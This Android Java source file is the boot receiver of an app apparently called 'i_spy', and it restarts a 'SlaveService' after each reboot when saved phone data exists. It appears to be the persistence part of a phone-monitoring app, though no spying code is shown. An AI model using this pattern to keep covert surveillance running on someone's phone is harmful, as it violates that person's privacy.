package com.um.asn.i_spy.listeners;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.um.asn.i_spy.models.Phone;
import com.um.asn.i_spy.services.SlaveService;

public class BootListener extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if ("android.intent.action.BOOT_COMPLETED".equals(intent.getAction())) {
            System.out.println("REBOOT REICEVER");
            Phone phone = new Phone();
            if (phone.loadWithFile(context)) {
                System.out.println("RESTART SERVICE");
                Intent myIntent = new Intent(context, SlaveService.class);
                context.startService(myIntent);
            }
        }
    }

}
